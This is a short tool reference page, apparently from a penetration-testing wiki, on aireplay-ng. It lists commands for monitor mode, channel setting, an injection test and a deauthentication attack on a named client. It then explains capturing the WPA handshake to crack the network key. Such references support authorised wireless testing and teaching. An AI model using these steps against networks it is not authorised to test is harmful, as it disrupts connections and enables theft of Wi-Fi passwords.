# Aireplay-ng

Check packet injection before deauth: confirm your wireless card can inject to the target AP by pinging it and checking response rate (shows link quality). If you have two cards, compare their ping results to see which injects better.

\# Start Monitor Mode

Copy

```
sudo airmon-ng start wlan0
```

\# Set Channel to 1

Copy

```
sudo iw dev wlan0mon set channel 1
```

\# Test for Packet Injection (Pre-requisite for performing attacks)

Copy

```
sudo aireplay-ng --test wlan0mon
```

\# Deauthentication request to one client

Copy

```
sudo aireplay-ng -0 10 -a F5:D2:00:AF:69:67 -c D5:00:B2:AF:23:24 wlan0mon
```

Deauth causes the client to drop and reconnect — visible as increased **Lost** and **Frames** counts. Airodump-ng will capture the four-way handshake; use `-w` to save it to a `.pcap`, using airodump-ng, which you can run with **aircrack-ng** to crack the PSK.

[PreviousAirdecap-ng](../../../../airdecap-ng.md) [NextAirgraph-ng](airgraph-ng.md)

Last updated 12 days ago
